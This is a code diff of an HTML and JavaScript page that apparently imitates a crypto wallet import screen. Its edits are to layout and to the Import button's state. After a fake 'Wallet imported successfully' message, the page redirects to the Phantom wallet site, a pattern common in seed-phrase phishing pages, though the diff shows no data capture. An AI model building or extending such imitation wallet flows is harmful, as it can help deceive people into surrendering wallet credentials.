@@ -25,19 +25,10 @@
     .network-option.selected { background: #2a2560; }
     .net-name { color: #fff; font-size: 15px; }
     .net-check { color: #a78bfa; font-size: 18px; }
-    .import-btn-fixed {
-      position: absolute; bottom: 32px; left: 24px;
-      width: calc(100% - 48px);
-    }
   </style>
 </head>
 <body>
 <div class="phone">
-  <div class="topbar">
-    
-    <div></div>
-  </div>
-
   <div class="nav-row">
     <a href="import-wallet.html" class="icon-btn">‹</a>
     <div class="step-dots">
@@ -71,9 +62,9 @@
 
   <div class="toast" id="toast">✓ Wallet imported successfully! Redirecting...</div>
 
- <button class="btn btn-dark-purple" id="import-btn" onclick="handleImport()" style="margin-bottom:16px;">
-  <span class="btn-text">Import</span>
-</button>
+  <button class="btn btn-dark-purple" id="import-btn" onclick="handleImport()" style="margin-bottom:16px;">
+    <span class="btn-text">Import</span>
+  </button>
 
   <!-- Network bottom sheet -->
   <div class="network-sheet" id="net-sheet">
@@ -127,6 +118,8 @@ function handleImport() {
   btn.classList.add('loading');
   btn.querySelector('.btn-text').textContent = 'Importing...';
   document.getElementById('toast').style.display = 'block';
+  btn.classList.remove('loading');
+  btn.querySelector('.btn-text').textContent = 'Import';
   setTimeout(function() { window.location.href = 'https://www.phantom.com'; }, 2500);
 }
 </script>
